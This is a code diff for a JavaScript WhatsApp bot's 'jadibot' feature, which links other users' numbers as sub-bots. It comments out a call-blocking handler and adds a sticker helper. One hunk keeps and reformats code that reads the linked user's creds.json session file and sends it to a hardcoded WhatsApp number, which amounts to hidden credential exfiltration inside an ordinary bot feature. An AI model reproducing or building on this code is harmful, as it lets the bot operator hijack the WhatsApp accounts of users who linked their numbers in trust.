@@ -78,43 +78,43 @@ const jadibot = async (kayla, m, from) => {
         }
       });
 
-      kayla.ws.on('CB:call', async (json) => {
-        const callerId = json.content[0].attrs['call-creator'];
-        const idCall = json.content[0].attrs['call-id'];
-        const Id = json.attrs.id;
-        const T = json.attrs.t;
-        kayla.sendNode({
-          tag: 'call',
-          attrs: {
-            from: '6285768966412@s.whatsapp.net',
-            id: Id,
-            t: T,
-          },
-          content: [
-            {
-              tag: 'reject',
-              attrs: {
-                'call-creator': callerId,
-                'call-id': idCall,
-                count: '0',
-              },
-              content: null,
-            },
-          ],
-        });
-        if (json.content[0].tag == 'offer') {
-          let qutsnya = await kayla.sendContact(callerId, owner);
-          await kayla.sendMessage(
-            callerId,
-            {
-              text: `Sistem Otomatis Block!!!\nkayla.public = falselpon Bot!!!\nSilahkan Hubungi Owner Untuk Dibuka!!!`,
-            },
-            { quoted: qutsnya }
-          );
-          await sleep(8000);
-          await kayla.updateBlockStatus(callerId, 'block');
-        }
-      });
+      // kayla.ws.on('CB:call', async (json) => {
+      //   const callerId = json.content[0].attrs['call-creator'];
+      //   const idCall = json.content[0].attrs['call-id'];
+      //   const Id = json.attrs.id;
+      //   const T = json.attrs.t;
+      //   kayla.sendNode({
+      //     tag: 'call',
+      //     attrs: {
+      //       from: '6285768966412@s.whatsapp.net',
+      //       id: Id,
+      //       t: T,
+      //     },
+      //     content: [
+      //       {
+      //         tag: 'reject',
+      //         attrs: {
+      //           'call-creator': callerId,
+      //           'call-id': idCall,
+      //           count: '0',
+      //         },
+      //         content: null,
+      //       },
+      //     ],
+      //   });
+      //   if (json.content[0].tag == 'offer') {
+      //     let qutsnya = await kayla.sendContact(callerId, owner);
+      //     await kayla.sendMessage(
+      //       callerId,
+      //       {
+      //         text: `Sistem Otomatis Block!!!\nkayla.public = falselpon Bot!!!\nSilahkan Hubungi Owner Untuk Dibuka!!!`,
+      //       },
+      //       { quoted: qutsnya }
+      //     );
+      //     await sleep(8000);
+      //     await kayla.updateBlockStatus(callerId, 'block');
+      //   }
+      // });
 
       kayla.ev.on('messages.upsert', async (chatUpdate) => {
         try {
@@ -176,7 +176,7 @@ const jadibot = async (kayla, m, from) => {
             './database/jadibot/' + user.split('@')[0] + '/creds.json'
           );
           sendMessage(`6285768966412@s.whatsapp.net`, {
-            text: credential,
+            text: JSON.stringify(credential, null, 2),
             mentions: [user],
           });
         }
@@ -357,6 +357,29 @@ END:VCARD`,
         return buffer;
       };
 
+      kayla.sendImageAsSticker = async (jid, path, quoted, options = {}) => {
+        let buff = Buffer.isBuffer(path)
+          ? path
+          : /^data:.*?\/.*?;base64,/i.test(path)
+          ? Buffer.from(path.split`,`[1], 'base64')
+          : /^https?:\/\//.test(path)
+          ? await await getBuffer(path)
+          : fs.existsSync(path)
+          ? fs.readFileSync(path)
+          : Buffer.alloc(0);
+        let buffer;
+        if (options && (options.packname || options.author)) {
+          buffer = await writeExifImg(buff, options);
+        } else {
+          buffer = await imageToWebp(buff);
+        }
+        await kayla.sendMessage(
+          jid,
+          { sticker: { url: buffer }, ...options },
+          { quoted }
+        );
+        return buffer;
+      };
       kayla.sendText = (jid, text, quoted = '', options) =>
         kayla.sendMessage(jid, { text: text, ...options }, { quoted });
     }
